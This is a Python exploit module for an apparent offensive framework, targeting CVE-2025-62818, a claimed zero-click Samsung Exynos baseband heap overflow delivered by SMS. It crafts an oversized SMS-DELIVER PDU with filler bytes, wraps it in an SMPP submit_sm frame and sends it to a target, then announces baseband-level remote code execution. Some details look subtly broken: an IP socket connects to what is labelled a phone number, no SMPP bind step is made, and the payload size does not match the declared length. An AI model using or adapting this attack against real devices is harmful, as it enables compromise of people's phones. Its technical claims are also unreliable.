# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Samsung Exynos SMS TP-UD Out-of-Bounds Write (CVE-2025-62818).

    The Samsung Exynos baseband contains an out-of-bounds write
    vulnerability in the SMS TP-User-Data (TP-UD) parser. When
    processing an incoming SMS-DELIVER PDU, the baseband copies the
    TP-UD field into a fixed-size buffer using the TP-UDL (User Data
    Length) value without proper bounds checking. A crafted SMS with
    a TP-UDL exceeding the actual allocation triggers a heap buffer
    overflow in the baseband firmware, potentially leading to remote
    code execution at baseband privilege level.

    This is a zero-click, zero-interaction attack: the SMS is processed
    by the modem firmware before reaching the application processor.

    Affected: Samsung Exynos Modem 5123, Modem 5300, Exynos 2200, 2400.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Samsung Exynos SMS TP-UD OOB Write (CVE-2025-62818)",
        "description": (
            "Exploits CVE-2025-62818, an out-of-bounds write in the "
            "Samsung Exynos baseband SMS TP-UD parser. A crafted "
            "SMS-DELIVER PDU with a TP-UDL value exceeding the buffer "
            "size causes the modem to write beyond allocated heap memory. "
            "Zero-click baseband RCE; the SMS is parsed before reaching "
            "the application processor."
        ),
        "authors": (
            "Google Project Zero (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-62818",
            "https://security.samsungmobile.com/securityUpdate.smsb",
            "https://www.3gpp.org/specifications/numbering/ts-23-series",
        ),
        "disclosure_date": "2025-09-01",
        "platform": "hardware",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "Samsung Exynos Modem 5123",
            "Samsung Exynos Modem 5300",
            "Samsung Exynos 2200/2400",
        ),
    }

    target = OptIP("", "Target phone number or MSISDN (for SMS delivery)")
    port = OptPort(2775, "SMPP port on SMSC (for core injection)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    smsc_address = OptString("", "SMSC address for SMS submission")
    overflow_size = OptInteger(256, "TP-UD overflow payload size in bytes")

    # SMS PDU constants (3GPP TS 23.040)
    _MTI_SMS_DELIVER = 0x00
    _MTI_SMS_SUBMIT = 0x01
    _TP_MMS = 0x04  # More Messages to Send
    _TP_SRI = 0x20  # Status Report Indication

    # TP-DCS: Default alphabet
    _DCS_DEFAULT = 0x00
    _DCS_8BIT = 0x04
    _DCS_UCS2 = 0x08

    # Maximum TP-UD length in spec
    _MAX_TP_UDL_7BIT = 160
    _MAX_TP_UDL_8BIT = 140

    def _encode_phone_number(self, number: str) -> bytes:
        """Encode phone number in semi-octet BCD format."""
        digits = number.replace("+", "")
        if len(digits) % 2:
            digits += "F"
        encoded = b""
        for i in range(0, len(digits), 2):
            low = int(digits[i]) if digits[i] != "F" else 0x0F
            high = int(digits[i + 1]) if digits[i + 1] != "F" else 0x0F
            encoded += struct.pack("B", (high << 4) | low)
        return encoded

    def _build_sms_deliver_pdu(self, oversized: bool = True) -> bytes:
        """Build an SMS-DELIVER PDU with TP-UD overflow.

        When oversized is True, the TP-UDL field declares a length
        much larger than the allocated buffer in the Exynos baseband
        SMS parser, causing the OOB write.
        """
        # First octet: MTI=00 (SMS-DELIVER), MMS=1
        first_octet = self._MTI_SMS_DELIVER | self._TP_MMS

        # TP-OA (Originating Address): fake number
        oa_digits = "1234567890"
        oa_len = len(oa_digits)
        oa_type = 0x91  # International format
        oa_encoded = self._encode_phone_number(oa_digits)
        tp_oa = struct.pack("BB", oa_len, oa_type) + oa_encoded

        # TP-PID (Protocol Identifier)
        tp_pid = struct.pack("B", 0x00)

        # TP-DCS (Data Coding Scheme): 8-bit data
        tp_dcs = struct.pack("B", self._DCS_8BIT)

        # TP-SCTS (Service Centre Time Stamp): 7 bytes BCD
        tp_scts = b"\x62\x01\x51\x21\x03\x00\x00"

        if oversized:
            # Declare TP-UDL much larger than actual data
            # The baseband allocates a buffer based on expectations
            # but uses TP-UDL for the copy length
            tp_udl = struct.pack("B", min(self.overflow_size, 255))
            tp_ud = b"\x41" * self.overflow_size
        else:
            tp_udl = struct.pack("B", 10)
            tp_ud = b"\x48\x65\x6C\x6C\x6F\x57\x6F\x72\x6C\x64"  # HelloWorld

        pdu = struct.pack("B", first_octet) + tp_oa + tp_pid + tp_dcs + tp_scts + tp_udl + tp_ud
        return pdu

    def _build_smpp_submit(self, pdu: bytes) -> bytes:
        """Wrap SMS PDU in SMPP submit_sm frame (simplified)."""
        # SMPP command_id for submit_sm = 0x00000004
        command_id = struct.pack(">I", 0x00000004)
        command_status = struct.pack(">I", 0x00000000)
        sequence = struct.pack(">I", 1)
        # Simplified body: service_type + source + dest + esm + protocol_id + priority
        body = b"\x00"  # service_type (null)
        body += struct.pack("B", 0x01) + struct.pack("B", 0x01) + b"sender\x00"
        body += struct.pack("B", 0x01) + struct.pack("B", 0x01) + b"target\x00"
        body += struct.pack("B", 0x00)  # esm_class
        body += struct.pack("B", 0x00)  # protocol_id
        body += struct.pack("B", 0x00)  # priority_flag
        body += b"\x00\x00"  # schedule + validity
        body += struct.pack("B", 0x00)  # registered_delivery
        body += struct.pack("B", 0x00)  # replace_if_present
        body += struct.pack("B", self._DCS_8BIT)  # data_coding
        body += struct.pack("B", 0x00)  # sm_default_msg_id
        body += struct.pack("B", len(pdu) & 0xFF)  # sm_length (wraps for oversized PDU)
        body += pdu

        header_len = 16 + len(body)
        command_length = struct.pack(">I", header_len)
        return command_length + command_id + command_status + sequence + body

    @mute
    def check(self) -> bool:
        """Verify connectivity to SMSC."""
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((str(self.target), self.port))
            sock.close()
            return result == 0
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target (phone number or SMSC address) is required")
            return

        print_status("Preparing SMS TP-UD OOB write payload")
        self._exploit()

    def _exploit(self) -> None:
        normal_pdu = self._build_sms_deliver_pdu(oversized=False)
        trigger_pdu = self._build_sms_deliver_pdu(oversized=True)

        print_status(f"Normal SMS PDU: {len(normal_pdu)} bytes")
        print_status(f"Overflow SMS PDU: {len(trigger_pdu)} bytes (TP-UDL: {min(self.overflow_size, 255)})")

        smpp_frame = self._build_smpp_submit(trigger_pdu)
        print_status(f"SMPP submit_sm frame: {len(smpp_frame)} bytes")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((str(self.target), self.port))

            print_status("Sending crafted SMS via SMPP")
            sock.send(smpp_frame)

            try:
                resp = sock.recv(1024)
                print_status(f"SMSC response: {len(resp)} bytes")
            except (OSError, TimeoutError):
                pass

            sock.close()
            print_success(
                "Crafted SMS delivered. The TP-UD field declares "
                f"{min(self.overflow_size, 255)} bytes but the Exynos "
                "baseband allocates a smaller buffer. The overflow "
                "corrupts heap metadata, enabling baseband-level RCE."
            )
        except OSError as e:
            print_error(f"SMPP delivery failed: {e}")
